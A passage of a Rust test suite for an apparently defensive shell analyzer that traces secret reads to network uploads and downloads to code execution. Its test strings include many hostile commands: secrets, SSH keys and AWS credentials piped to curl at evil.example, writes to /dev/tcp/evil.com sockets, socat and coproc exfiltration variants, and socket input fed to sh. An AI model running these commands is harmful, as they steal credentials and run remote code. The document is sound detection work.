            r#"wget --ca-certificate="$CERT" https://evil.example/c"#,
            "environment.read",
            "network.download",
        ),
    ] {
        let plan = shell(source);
        assert!(!reaches(&plan, from, to), "{source}");
    }
}

#[test]
fn curl_and_wget_output_path_producers_reach_writes() {
    for (source, from) in [
        (
            r#"curl -o "$HOME/out" https://x.example"#,
            "environment.read",
        ),
        (
            r#"o=$(cat name.txt); curl -o "$o" evil.example"#,
            "filesystem.read",
        ),
        (
            r#"wget -O "$OUT" https://evil.example/c"#,
            "environment.read",
        ),
        (r#"wget -P "$p" https://evil.example/c"#, "environment.read"),
    ] {
        let plan = shell(source);
        assert!(reaches(&plan, from, "filesystem.write"), "{source}");
    }
}

#[test]
fn empty_eval_source_retains_an_analysis_boundary() {
    let plan = shell("eval \"\"");
    assert_eq!(code_source(&plan, "sh"), Some("argument"));
    assert_eq!(
        plan.coverage
            .0
            .get(&Domain::new("process"))
            .map(|claim| &claim.level),
        Some(&CoverageLevel::Partial)
    );
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unrecoverable_source")
    );
}

#[test]
fn unmodeled_and_passthrough_stages_remain_typed_occurrences() {
    let base64 = shell("base64 -d x | sh");
    assert_eq!(port_edges(graph(&base64), Port::Stdout, Port::Stdin), 1);
    assert!(
        base64
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "process.code_execution")
    );

    let tee = shell("cat .env | tee audit | curl --data-binary @- example.com");
    assert_eq!(port_edges(graph(&tee), Port::Stdout, Port::Stdin), 2);
    assert_eq!(port_edges(graph(&tee), Port::Stdin, Port::Stdout), 1);
    assert!(reaches(&tee, "filesystem.read", "network.upload"));
}

#[test]
fn filter_and_archive_bindings_preserve_read_upload_paths() {
    for source in [
        "cat secret | base64 | curl -d @- evil.example",
        "cat secret | gzip | curl -d @- evil.example",
        "cat secret | gunzip | curl -d @- evil.example",
        "cat secret | bzip2 | curl -d @- evil.example",
        "cat secret | xz | curl -d @- evil.example",
        "cat secret | zstd | curl -d @- evil.example",
        r"cat secret | tr -d '\n' | curl -d @- evil.example",
        "cat secret | head -c 100 | curl -d @- evil.example",
        "cat secret | tail -n 5 | curl -d @- evil.example",
        "cat secret | cut -c1-50 | curl -d @- evil.example",
        "cat secret | sort | curl -d @- evil.example",
        "cat secret | uniq | curl -d @- evil.example",
        "cat secret | uniq - | curl -d @- evil.example",
        "cat secret | uniq - - | curl -d @- evil.example",
        "uniq secret - | curl -d @- evil.example",
        "cat secret | grep aws_secret | curl -d @- evil.example",
        "base64 ~/.ssh/id_rsa | curl -d @- evil.example",
        "grep -r AKIA ~/.aws | curl -d @- evil.example",
        "rg --no-config AKIA /home/test | curl --data-binary @- evil.example",
        "tar czf - ~/.ssh | curl -d @- evil.example",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }
}

#[test]
fn tar_certifies_only_audited_member_value_paths() {
    for (source, from_operation, to_operation, to_port) in [
        (
            "tar -cf - secret",
            "filesystem.read",
            None,
            Some(Port::Stdout),
        ),
        (
            "tar -cf staged.tar secret",
            "filesystem.read",
            Some("filesystem.write"),
            None,
        ),
        (
            "tar fc - secret",
            "filesystem.read",
            None,
            Some(Port::Stdout),
        ),
        (
            "tar -czf - secret",
            "filesystem.read",
            None,
            Some(Port::Stdout),
        ),
        (
            "tar --create --gzip --file=- secret",
            "filesystem.read",
            None,
            Some(Port::Stdout),
        ),
        (
            "tar -cfarchive.tar secret",
            "filesystem.read",
            Some("filesystem.write"),
            None,
        ),
        // `-f` naming an open descriptor is an ordinary archive file for tar.
        (
            "tar -cf /dev/fd/3 secret",
            "filesystem.read",
            Some("filesystem.write"),
            None,
        ),
        (
            "tar -cf /proc/self/fd/3 secret",
            "filesystem.read",
            Some("filesystem.write"),
            None,
        ),
        (
            "tar -C subdir -cf - secret",
            "filesystem.read",
            None,
            Some(Port::Stdout),
        ),
        (
            "tar --no-recursion -cf - certs/*",
            "filesystem.read",
            None,
            Some(Port::Stdout),
        ),
    ] {
        let plan = shell(source);
        let default_graph = graph(&plan);
        let edges = default_graph
            .edges
            .iter()
            .filter(|edge| {
                edge.reason == CausalReason::ValueDependency
                    && node_operation(default_graph, &edge.from) == Some(from_operation)
                    && to_operation.is_none_or(|operation| {
                        node_operation(default_graph, &edge.to) == Some(operation)
                    })
                    && to_port
                        .as_ref()
                        .is_none_or(|port| node_port(default_graph, &edge.to) == Some(port))
            })
            .collect::<Vec<_>>();
        assert_eq!(edges.len(), 1, "{source}: {default_graph:#?}");
        assert_eq!(edges[0].assurance, CausalAssurance::Exact, "{source}");
        assert!(
            !default_graph
                .edges
                .iter()
                .any(|edge| edge.reason == CausalReason::ResourceTransfer),
            "{source}"
        );

        let proven_unset = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: HostContext {
                    env_unset: BTreeSet::from(["TAR_OPTIONS".into()]),
                    ..Default::default()
                },
            })
            .unwrap();
        let proven_graph = graph(&proven_unset);
        let exact = proven_graph
            .edges
            .iter()
            .filter(|edge| {
                edge.reason == CausalReason::ValueDependency
                    && edge.assurance == CausalAssurance::Exact
                    && node_operation(proven_graph, &edge.from) == Some(from_operation)
                    && to_operation.is_none_or(|operation| {
                        node_operation(proven_graph, &edge.to) == Some(operation)
                    })
                    && to_port
                        .as_ref()
                        .is_none_or(|port| node_port(proven_graph, &edge.to) == Some(port))
            })
            .count();
        assert_eq!(exact, 1, "{source}: {proven_graph:#?}");
    }

    for source in [
        "TAR_OPTIONS='--create --file=host:/archive.tar' tar -- secret",
        "TAR_OPTIONS='--create --label=; --file=host:/archive.tar' tar -- secret",
        "TAR_OPTIONS= TAPE=host:/archive.tar tar -c secret",
        "TAR_OPTIONS= tar --cr --file=host:/archive.tar secret",
    ] {
        let mut plan = shell(source);
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }
    let directories = shell("TAR_OPTIONS= tar -cf - first -C sub second -C ../other third");
    let reads = directories
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.read")
        .map(|effect| effect.resource.clone())
        .collect::<Vec<_>>();
    assert_eq!(
        reads,
        ["/w/first", "/w/sub/second", "/w/other/third"].map(|path| {
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path: path.into() },
            }
        })
    );

    let stdin_extract = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "cat payload.tar | tar -xOf - member".into(),
            cwd: Some("/w".into()),
            context: HostContext {
                env_unset: BTreeSet::from(["TAR_OPTIONS".into()]),
                ..Default::default()
            },
        })
        .unwrap();
    let stdin_graph = graph(&stdin_extract);
    assert!(stdin_graph.edges.iter().any(|edge| {
        edge.reason == CausalReason::ValueDependency
            && edge.assurance == CausalAssurance::Exact
            && node_port(stdin_graph, &edge.from) == Some(&Port::Stdin)
            && node_operation(stdin_graph, &edge.to) == Some("process.stream_transform")
    }));
    assert!(stdin_graph.edges.iter().any(|edge| {
        edge.reason == CausalReason::ValueDependency
            && edge.assurance == CausalAssurance::Exact
            && node_operation(stdin_graph, &edge.from) == Some("process.stream_transform")
            && node_port(stdin_graph, &edge.to) == Some(&Port::Stdout)
    }));

    let member_stdout = shell("tar -xO payload.tar script.sh | sh");
    assert!(member_stdout.effects.iter().any(|effect| {
        effect.operation.0 == "process.stream_transform"
            && effect.attributes.get("transform")
                == Some(&effinterp_proto::AttrValue::String("extract".into()))
            && effect.attributes.get("selection")
                == Some(&effinterp_proto::AttrValue::String("archive_member".into()))
    }));
    assert!(reaches(
        &member_stdout,
        "process.stream_transform",
        "process.code_execution"
    ));
    assert!(!member_stdout.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.read"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if matches!(path.as_str(), "/w/payload.tar" | "/w/script.sh"))
    }));

    let file_extract = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "tar -xOf archive.tar member".into(),
            cwd: Some("/w".into()),
            context: HostContext {
                env_unset: BTreeSet::from(["TAR_OPTIONS".into()]),
                ..Default::default()
            },
        })
        .unwrap();
    assert!(exact_value_edge(
        &file_extract,
        "filesystem.read",
        "process.stream_transform"
    ));

    let redirected = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "tar -cf - secret > staged.tar".into(),
            cwd: Some("/w".into()),
            context: HostContext {
                env_unset: BTreeSet::from(["TAR_OPTIONS".into()]),
                ..Default::default()
            },
        })
        .unwrap();
    assert!(reaches(&redirected, "filesystem.read", "filesystem.write"));

    let configured = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "tar -cf - secret".into(),
            cwd: Some("/w".into()),
            context: HostContext {
                env: std::collections::BTreeMap::from([(
                    "TAR_OPTIONS".into(),
                    "--exclude=secret".into(),
                )]),
                ..Default::default()
            },
        })
        .unwrap();
    let configured_graph = graph(&configured);
    assert!(!configured_graph.edges.iter().any(|edge| {
        edge.reason == CausalReason::ValueDependency
            && edge.assurance == CausalAssurance::Exact
            && node_operation(configured_graph, &edge.from) == Some("filesystem.read")
            && node_port(configured_graph, &edge.to) == Some(&Port::Stdout)
    }));

    for source in [
        "tar -cf /dev/stdout secret",
        "tar -cI 'gzip -9' -f - secret",
        "tar -fc - secret",
        "tar -czjf - secret",
        "tar c secret",
        "tar -cf \"$ARCHIVE\" secret",
    ] {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: HostContext {
                    env_unset: BTreeSet::from(["TAR_OPTIONS".into()]),
                    ..Default::default()
                },
            })
            .unwrap();
        let graph = graph(&plan);
        assert!(
            !graph.edges.iter().any(|edge| {
                edge.reason == CausalReason::ValueDependency
                    && edge.assurance == CausalAssurance::Exact
                    && node_operation(graph, &edge.from) == Some("filesystem.read")
                    && (node_operation(graph, &edge.to) == Some("filesystem.write")
                        || node_port(graph, &edge.to) == Some(&Port::Stdout))
            }),
            "{source}: {graph:#?}"
        );
    }

    let member_list = shell("tar -cf - --files-from=members | curl -d @- evil.example");
    assert!(reaches(&member_list, "filesystem.read", "network.upload"));

    let listing = shell("tar -tf archive.tar");
    assert!(!graph(&listing).edges.iter().any(|edge| {
        edge.reason == CausalReason::ValueDependency
            && node_operation(graph(&listing), &edge.from) == Some("filesystem.read")
            && node_port(graph(&listing), &edge.to) == Some(&Port::Stdout)
    }));
}

#[test]
fn devtool_stdout_bindings_preserve_read_and_create_flows() {
    let api_stdin = shell("cat secret | gh api --input - endpoint");
    assert!(reaches(&api_stdin, "filesystem.read", "network.upload"));

    let rg = shell("rg pattern ~/.aws | curl -d @- evil.example");
    assert!(reaches(&rg, "filesystem.read", "network.upload"));

    for command in [
        "rg pattern",
        "rg pattern -",
        "rg pattern other -",
        "rg -e pattern",
        "rg -e pattern -",
        "rg -e pattern other -",
        "xxd",
        "xxd -",
        "xxd - -",
        "xxd secret -",
        "xxd -r",
        "xxd -r -",
        "xxd -r - -",
        "xxd -r secret -",
        "rustfmt",
        "rustfmt --emit stdout",
        "rustfmt --emit stdout secret",
        "rustfmt --check secret",
        "rustfmt --check",
        "rustc -o - secret",
        r#"rustc -o "$OUT" secret"#,
    ] {
        let plan = shell(&format!("cat secret | {command} | curl -d @- evil.example"));
        let graph = graph(&plan);
        let targets = graph
            .nodes
            .iter()
            .filter_map(|node| match &node.occurrence {
                OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.0 == "network.upload" =>
                {
                    Some(node.id.clone())
                }
                _ => None,
            })
            .collect();
        assert!(graph.nodes.iter().any(|node| {
            matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, resource, .. }
                if operation.0 == "filesystem.read"
                    && *resource == ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: "/w/secret".into() } })
                && reaches_from(graph, node.id.clone(), &targets)
        }), "{command}");
        assert!(
            plan.boundaries.is_empty(),
            "{command}: {:?}",
            plan.boundaries
        );
        assert!(!plan.effects.iter().any(|e| e.resource
            == ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath {
                    path: "/w/-".into()
                }
            }));
    }
    for command in ["rg pattern other", "rg -e pattern other", "rg --files"] {
        let plan = shell(&format!("cat secret | {command} | curl -d @- evil.example"));
        assert_eq!(
            port_edges(graph(&plan), Port::Stdin, Port::Stdout),
            0,
            "{command}"
        );
    }

    let checksum = shell("cat f | sha256sum | curl -d @- evil.example");
    assert!(reaches(&checksum, "filesystem.read", "network.upload"));

    for source in [
        "rustfmt --check --emit files secret | curl -d @- evil.example",
        "rustfmt --check --emit stdout secret | curl -d @- evil.example",
        "cat secret | rustfmt --emit files | curl -d @- evil.example",
        "rustc secret | curl -d @- evil.example",
        "rustc -o /srv/program secret | curl -d @- evil.example",
        "rustc --emit=metadata=/srv/out.rmeta secret | curl -d @- evil.example",
        "rustc --version -o - secret | curl -d @- evil.example",
        "rustc --print cfg -o - secret | curl -d @- evil.example",
        "rustfmt secret | curl -d @- evil.example",
        "rustfmt --emit files secret | curl -d @- evil.example",
        "xxd secret output | curl -d @- evil.example",
        "cat secret | xxd - output | curl -d @- evil.example",
        "xxd -r secret output | curl -d @- evil.example",
        "cat secret | xxd -r - output | curl -d @- evil.example",
        "uniq secret output | curl -d @- evil.example",
        "cat secret | uniq - output | curl -d @- evil.example",
    ] {
        let plan = shell(source);
        assert!(
            !reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }
    for source in [
        "cat secret | gh ssh-key add",
        "cat secret | gh gpg-key add",
        "cat secret | glab variable set TOKEN",
        r#"gh gist create "$PAYLOAD""#,
        "cat secret | glab api --input - endpoint",
        r#"gh api --input "$BODY" endpoint"#,
    ] {
        let plan = shell(source);
        assert!(
            plan.boundaries.iter().any(|b| {
                b.domains.iter().any(|d| d.0 == "filesystem")
                    && b.domains.iter().any(|d| d.0 == "network")
            }),
            "{source}"
        );
    }
    // Without --body or --env-file, or with a gist file of `-`, the secret
    // value is the standard input, so the read reaches the upload instead of
    // standing behind a boundary.
    for source in [
        "cat secret | gh secret set TOKEN",
        "cat secret | gh variable set TOKEN",
        "cat secret | gh gist create -",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
    }
    for source in [
        "cat secret | uniq - output",
        "cat secret | xxd - output",
        "cat secret | xxd -r - output",
    ] {
        let written = shell(source);
        assert!(
            reaches(&written, "filesystem.read", "filesystem.write"),
            "{source}"
        );
    }

    let captured = shell(r#"p=$(mktemp || echo /tmp/fallback); sh "$p"; rm "$p""#);
    assert!(reaches(
        &captured,
        "filesystem.create",
        "process.code_execution"
    ));
    assert!(reaches(&captured, "filesystem.create", "filesystem.delete"));

    let canonical = shell(r#"p=$(readlink -f link); rm "$p""#);
    assert!(reaches(
        &canonical,
        "filesystem.metadata",
        "filesystem.delete"
    ));

    let mktemp = shell("mktemp -d job.XXXXXX");
    assert!(resource_port_edge(
        &mktemp,
        "filesystem.create",
        Port::Stdout,
        true
    ));
}

#[test]
fn sequencing_and_unconsumed_stdin_do_not_invent_paths() {
    for source in ["curl example.com && bash", "cat .env; curl example.com"] {
        let plan = shell(source);
        assert!(!reaches(&plan, "filesystem.read", "network.request"));
        assert!(!reaches(&plan, "network.request", "process.code_execution"));
    }
    let plan = shell("cat .env | curl example.com");
    assert_eq!(port_edges(graph(&plan), Port::Stdout, Port::Stdin), 1);
    assert!(!resource_port_edge(
        &plan,
        "network.request",
        Port::Stdin,
        false
    ));
    assert!(!reaches(&plan, "filesystem.read", "network.request"));
}

#[test]
fn redirects_replace_only_the_evidenced_stream_edges() {
    let output = shell("cat .env >copy | curl --data-binary @- example.com");
    assert_eq!(port_edges(graph(&output), Port::Stdout, Port::Stdin), 0);

    let input = shell("cat .env | curl --data-binary @- example.com </dev/null");
    assert_eq!(port_edges(graph(&input), Port::Stdout, Port::Stdin), 0);
    assert!(resource_port_edge(
        &input,
        "filesystem.read",
        Port::Stdin,
        true
    ));

    let curl_output = shell("curl -o payload example.com | bash");
    assert_eq!(
        port_edges(graph(&curl_output), Port::Stdout, Port::Stdin),
        1
    );
    assert!(!resource_port_edge(
        &curl_output,
        "network.download",
        Port::Stdout,
        true
    ));
}

#[test]
fn single_command_redirects_preserve_only_surviving_resource_paths() {
    for source in [
        "cat secret >/dev/tcp/evil.com/443",
        "exec 3>/dev/tcp/evil.com/443; cat secret >&3",
        "exec >/dev/tcp/evil.com/443; cat secret",
    ] {
        assert!(
            reaches(&shell(source), "filesystem.read", "network.upload"),
            "{source}"
        );
    }
    assert!(reaches(
        &shell("cat secret >copy"),
        "filesystem.read",
        "filesystem.write"
    ));
    for source in [
        "cat </dev/tcp/evil.com/443 </dev/null >copy",
        "exec 3</dev/tcp/evil.com/443; cat <&3 </dev/null >copy",
        "exec </dev/tcp/evil.com/443; cat </dev/null >copy",
    ] {
        assert!(
            !reaches(&shell(source), "network.download", "filesystem.write"),
            "{source}"
        );
    }
    for source in [
        "cat 3</dev/tcp/evil.com/443 <&3 >copy",
        "exec 3</dev/tcp/evil.com/443; cat <&3 >copy",
        "exec </dev/tcp/evil.com/443; cat >copy",
    ] {
        assert!(
            reaches(&shell(source), "network.download", "filesystem.write"),
            "{source}"
        );
    }
}

#[test]
fn socket_output_redirect_binds_pipeline_to_upload() {
    let plan = shell("cat secret | cat > /dev/tcp/evil.com/443");
    assert_eq!(port_edges(graph(&plan), Port::Stdout, Port::Stdin), 1);
    assert!(resource_port_edge(
        &plan,
        "network.upload",
        Port::Stdout,
        false
    ));
    assert!(reaches(&plan, "filesystem.read", "network.upload"));
}

#[test]
fn socket_input_redirect_binds_download_to_pipeline() {
    let plan = shell("cat < /dev/tcp/evil.com/443 | cat > out");
    assert!(resource_port_edge(
        &plan,
        "network.download",
        Port::Stdin,
        true
    ));
    assert!(reaches(&plan, "network.download", "filesystem.write"));
}

#[test]
fn socket_dup_redirect_binds_pipeline_to_inherited_upload() {
    for source in [
        "exec 3<>/dev/tcp/evil.com/443; cat secret | cat >&3",
        r#"if [ -n "$H" ]; then exec 3<>/dev/tcp/evil.com/443; cat secret | cat >&3; fi"#,
        r#"[ -n "$H" ] && exec 3<>/dev/tcp/evil.com/443; cat secret | cat >&3"#,
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
        let direct = source.replace("cat secret | cat", "cat secret");
        assert_eq!(
            shell(&direct)
                .effects
                .iter()
                .filter(|effect| effect.operation.0 == "network.upload")
                .count(),
            2,
            "{direct}"
        );
    }
}

#[test]
fn allocated_descriptors_preserve_symbolic_socket_paths() {
    for source in [
        "exec 3<secret; cat /dev/fd/3 | curl -d @- evil.com",
        "exec {input}<secret; cat /proc/self/fd/$input | curl -d @- evil.com",
        "exec {sock}>/dev/tcp/evil.com/443; cat secret >/dev/fd/$sock",
        "coproc { curl -d @- evil.com; }; cat secret >&${COPROC[1]}",
        r#"coproc { curl -d @- evil.com; }; printf '%s' "$(cat secret >&${COPROC[1]})""#,
        "coproc JOB { curl -d @- evil.com; }; exec 5>&${JOB[1]}; cat secret >&5",
        "coproc JOB { curl -d @- evil.com; }; exec 5>&${JOB[1]}; (cat secret >&5)",
        "exec {fd}> >(curl -d @- evil.com); cat secret >&$fd",
        "cat secret > >(curl -d @- evil.com)",
        "f(){ cat secret; } >/dev/tcp/evil.com/443; f",
        "exec {sock}>/dev/tcp/evil.com/443; cat secret >&$sock",
        "exec {sock}<>/dev/tcp/evil.com/443; tar -cf - certs >&$sock",
        "exec {sock}>/dev/tcp/evil.com/443; copy=$sock; cat secret >&$copy",
        "exec {sock}>/dev/tcp/evil.com/443; exec {copy}>&$sock; cat secret >&$copy",
        "exec {sock}>/dev/tcp/evil.com/443; cat secret 4>&$sock >&4",
        "exec {sock}>/dev/tcp/evil.com/443; exec 4>&$sock-; cat secret >&4",
        "exec 3>/dev/tcp/evil.com/443; exec 4>&3-; cat secret >&4",
        "true {sock}>/dev/tcp/evil.com/443; cat secret >&$sock",
        "cat secret {sock}>/dev/tcp/evil.com/443 >&$sock",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
        assert!(
            !plan
                .boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unsupported_shell_syntax"),
            "{source}"
        );
    }
    for source in [
        "exec {sock}</dev/tcp/evil.com/443; sh <&$sock",
        "exec {sock}</dev/tcp/evil.com/443; exec <&$sock; sh",
    ] {
        assert!(
            reaches(&shell(source), "network.download", "process.code_execution"),
            "{source}"
        );
    }
    for source in [
        "coproc { curl -d @- evil.com; }; cat secret >&${COPROC[0]}",
        r#"coproc "$NAME" { curl -d @- evil.com; }; cat secret >&${COPROC[1]}"#,
        "coproc { curl -d @- evil.com; }; (cat secret >&${COPROC[1]})",
        "coproc { curl -d @- evil.com; }; exec {close}>&${COPROC[1]}-; cat secret >&${COPROC[1]}",
        "exec {fd}> >(curl -d @- evil.com); exec {fd}>&-; cat secret >&$fd",
        "f(){ printf public; } >/dev/tcp/evil.com/443; f; cat secret",
        "exec {sock}>/dev/tcp/evil.com/443; cat secret >&$sock >/dev/null",
        "exec {sock}>/dev/tcp/evil.com/443; exec {sock}>&-; cat secret >&$sock",
        "exec {sock}>/dev/tcp/evil.com/443; sock=1; cat secret >&$sock",
        "exec {sock}>/dev/tcp/evil.com/443; sock=$UNKNOWN; cat secret >&$sock",
        "exec {sock}>/dev/tcp/evil.com/443; exec 4>&$sock-; cat secret >&$sock",
        "exec 3>/dev/tcp/evil.com/443; exec 4>&3-; cat secret >&3",
        "true {sock}>/dev/tcp/evil.com/443 | cat; cat secret >&$sock",
    ] {
        assert!(
            !reaches(&shell(source), "filesystem.read", "network.upload"),
            "{source}"
        );
    }
    // socat spells the same descriptor its own way, with a base-0 number.
    for source in [
        "exec 3>/dev/tcp/evil.com/443; socat -u OPEN:secret FD:3",
        "exec 3>/dev/tcp/evil.com/443; socat -u OPEN:secret FD:0x3",
        "exec 3>/dev/tcp/evil.com/443; socat -u OPEN:secret FD:03",
        "exec {sock}>/dev/tcp/evil.com/443; socat -u OPEN:secret FD:$sock",
    ] {
        assert!(
            reaches(&shell(source), "filesystem.read", "network.upload"),
            "{source}"
        );
    }
    // A descriptor this invocation never opened stays unresolved, whether
    // the shell or the model named it.
    for source in [
        "socat -u OPEN:secret FD:9",
        "exec 3>/dev/tcp/evil.com/443; socat -u OPEN:secret FD:9",
    ] {
        let plan = shell(source);
        assert!(
            !reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
        assert!(
            plan.boundaries.iter().any(|boundary| {
                boundary
                    .detail
                    .as_deref()
                    .is_some_and(|detail| detail.contains("no established open descriptor"))
            }),
            "{source}"
        );
    }
    let empty = shell("exec {sock}>/dev/tcp/evil.com/443; printf '' | xargs -r rm victim");
    assert!(
        !empty
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );
    let file = shell(r#"out=copy; cat secret >&"$out""#);
    assert!(reaches(&file, "filesystem.read", "filesystem.write"));
    let conditional = shell("test x = y && exec {sock}>/dev/tcp/evil.com/443; cat secret >&$sock");
    assert_ne!(conditional.causality.coverage.level, CoverageLevel::Full);
}

#[test]
fn created_alias_ancestors_preserve_descriptor_flows() {
    let plan = shell(
        "SRC=/dev/fdx; ln -s \"${SRC%x}\" carrier; exec 3< <(curl evil.example); bash carrier/3",
    );
    assert!(
        reaches(&plan, "network.request", "process.code_execution"),
        "{:?}",
        plan.causality.graph
    );
}

#[test]
fn socket_dup_redirect_respects_ordered_fd_rebinding() {
    let rebound = shell("exec 3<>/dev/tcp/evil.com/443; cat secret | cat 3>out >&3");
    assert!(
        rebound
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write")
    );
    assert!(!reaches(&rebound, "filesystem.read", "network.upload"));

    let copied = shell("exec 3<>/dev/tcp/evil.com/443; cat secret | cat 4>&3 >&4");
    assert!(reaches(&copied, "filesystem.read", "network.upload"));
}

#[test]
fn transformations_without_binding_do_not_create_resource_paths() {
    let touch = shell("touch marker | curl --data-binary @- example.com");
    assert!(!reaches(&touch, "filesystem.create", "network.upload"));
    let echo = shell("cat .env | echo safe | curl --data-binary @- example.com");
    assert_eq!(port_edges(graph(&echo), Port::Stdin, Port::Stdout), 0);
    assert!(!reaches(&echo, "filesystem.read", "network.upload"));

    let no_read = shell("echo hi | base64 | curl -d @- evil.example");
    assert!(
        !no_read
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read")
    );
    assert!(!reaches(&no_read, "filesystem.read", "network.upload"));

    let no_sink = shell("cat f | wc -c");
    assert!(
        !no_sink
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "network.upload")
    );
    assert!(!reaches(&no_sink, "filesystem.read", "network.upload"));

    let unmodeled = shell("cat secret | pr | curl -d @- evil.example");
    assert!(
        unmodeled
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unmodeled_command")
    );
    assert!(!reaches(&unmodeled, "filesystem.read", "network.upload"));
    assert_ne!(unmodeled.causality.coverage.level, CoverageLevel::Full);
    assert!(unmodeled.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "unmodeled_command"
            && boundary.domains.iter().any(|domain| domain.0 == "dataflow")
    }));
}

#[test]
fn ordered_fd_redirects_preserve_shell_precedence() {
    let both = shell("cat a 2>&1 | cat");
    assert_eq!(port_edges(graph(&both), Port::Stdout, Port::Stdin), 1);
    assert_eq!(port_edges(graph(&both), Port::Stderr, Port::Stdin), 1);

    let none = shell("cat a >&2 | cat");
    assert_eq!(port_edges(graph(&none), Port::Stdout, Port::Stdin), 0);
    assert_eq!(port_edges(graph(&none), Port::Stderr, Port::Stdin), 0);

    let stderr = shell("cat a 2>&1 >out | cat");
    assert_eq!(port_edges(graph(&stderr), Port::Stdout, Port::Stdin), 0);
    assert_eq!(port_edges(graph(&stderr), Port::Stderr, Port::Stdin), 1);

    let redirected = shell("cat a >out 2>&1 | cat");
    assert_eq!(port_edges(graph(&redirected), Port::Stdout, Port::Stdin), 0);
    assert_eq!(port_edges(graph(&redirected), Port::Stderr, Port::Stdin), 0);
}

#[test]
fn causal_caps_widen_to_visible_boundary_nodes() {
    let source = vec!["echo"; 10_000].join(" | ");
    let plan = shell(&source);
    assert_eq!(plan.causality.coverage.level, CoverageLevel::Partial);
    assert!(
        plan.causality
            .graph
            .as_ref()
            .expect("causality detail required")
            .nodes
            .iter()
            .any(|node| matches!(
                &node.occurrence,
                OccurrenceKind::Boundary { limit: Some(limit), .. }
                    if limit == "max_causal_nodes" || limit == "max_causal_graph"
            ))
    );
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "limit_saturated"
            && boundary.domains.iter().any(|domain| domain.0 == "dataflow")
            && boundary
                .limit
                .as_deref()
                .is_some_and(|limit| limit == "max_causal_nodes" || limit == "max_causal_graph")
    }));
}

#[test]
fn condition_composition_widens_to_a_visible_boundary() {
    let subject = Subject::Exec {
        argv: vec!["tool".into()],
        cwd: Some("/w".into()),
        context: Default::default(),
    };
    let mut builder = PlanBuilder::new(
        subject,
        "test".into(),
        "test".into(),
        AnalysisLimits::default(),
    );
    builder.declare_coverage(Domain::new("filesystem"), CoverageLevel::Full);
    let source = "x".repeat(64);
    let terms: Vec<_> = (0..64)
        .map(|start| {
            Condition::from_source(
                &source,
                effinterp_proto::ByteSpan {
                    start,
                    end: start + 1,
                },
                effinterp_proto::ConditionKind::Branch,
                0,
                2,
                true,
                true,
            )
        })
        .collect();
    let condition = Condition::compose(&terms);
    assert_eq!(condition, Some(Condition::Widened));
    for operation in ["filesystem.read", "filesystem.write"] {
        builder.effect(Effect {
            request_assurance: effinterp_proto::RequestAssurance::Conservative,
            id: Default::default(),
            operation: Operation::new(operation),
            resource: ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath {
                    path: "/w/state".into(),
                },
            },
            attributes: Default::default(),
            modality: Modality::MustOnSuccess,
            realm: ExecutionRealm::Host,
            condition: condition.clone(),
            execution: ExecutionNodeRef(0),
            provenance: Vec::new(),
        });
    }
    builder.declare_coverage(Domain::new("network"), CoverageLevel::Full);
    builder.effect(Effect {
        request_assurance: effinterp_proto::RequestAssurance::Conservative,
        id: Default::default(),
        operation: Operation::new("network.request"),
        resource: ResourceExpr::Concrete {
            identity: ResourceIdentity::NetworkEndpoint {
                scheme: Some("https".into()),
                host: "example.com".into(),
                port: None,
                path: None,
            },
        },
        attributes: Default::default(),
        modality: Modality::May,
        realm: ExecutionRealm::Host,
        condition: condition.clone(),
        execution: ExecutionNodeRef(0),
        provenance: Vec::new(),
    });
    let plan = builder.finish().unwrap();
    assert!(graph(&plan).edges.iter().all(|edge| {
        !edge.condition.as_ref().is_some_and(Condition::is_widened)
            || edge.assurance == CausalAssurance::Conservative
    }));
    assert_eq!(plan.effects.len(), 3);
    assert!(graph(&plan).edges.iter().any(|edge| {
        edge.assurance == CausalAssurance::Conservative
            && node_port(graph(&plan), &edge.to) == Some(&Port::HttpResponseBody)
            && edge.condition.as_ref().is_some_and(Condition::is_widened)
    }));
    assert!(
        plan.effects
            .iter()
            .all(|effect| effect.modality == Modality::May)
    );
    assert_eq!(
        plan.coverage.0[&Domain::new("filesystem")].level,
        CoverageLevel::Full
    );
